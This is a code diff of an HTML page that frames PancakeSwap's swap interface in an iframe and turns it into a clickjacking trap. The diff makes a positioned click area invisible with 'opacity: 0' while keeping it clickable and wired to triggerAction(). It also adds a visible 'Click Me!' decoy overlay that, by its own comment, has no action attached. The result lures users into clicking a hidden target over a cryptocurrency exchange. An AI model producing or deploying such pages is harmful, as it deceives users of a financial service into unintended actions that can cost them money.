@@ -42,20 +42,21 @@
             z-index: 2;
             text-align: center;
         }
-        /* Specific clickable area */
+        /* Specific clickable area - this is now invisible */
         .click-area {
             position: absolute;
             top: 30%;
             left: 30%;
             width: 150px;
             height: 50px;
-            background-color: rgba(255, 0, 0, 0.5);
+            background-color: rgba(255, 0, 0, 0.5); /* Red background */
             color: white;
             text-align: center;
             padding: 10px;
             font-size: 16px;
             cursor: pointer;
             z-index: 3;
+            opacity: 0; /* Make it invisible but still clickable */
         }
         .click-area:hover {
             background-color: rgba(255, 0, 0, 0.8);
@@ -67,14 +68,15 @@
         <!-- Iframe containing PancakeSwap -->
         <iframe src="https://pancakeswap.finance/swap" frameborder="0"></iframe>
 
-        <!-- Clickable area where the user will trigger a specific action -->
-        <div class="click-area" onclick="triggerAction()">
-            Click Here to Trigger Action
+        <!-- The overlay will be visible with no action -->
+        <div class="overlay">
+            Click Me! <!-- This will remain visible with no action attached -->
         </div>
 
-        <!-- Optional: Visible Overlay Button (this could trick users) -->
-        <div class="overlay" onclick="alert('Clicked on overlay!');">
-            Click Me!
+        <!-- The clickable area is invisible, but still clickable -->
+        <div class="click-area" onclick="triggerAction()">
+            <!-- The text is still here but will not be visible -->
+            Click Here to Trigger Action
         </div>
     </div>
 
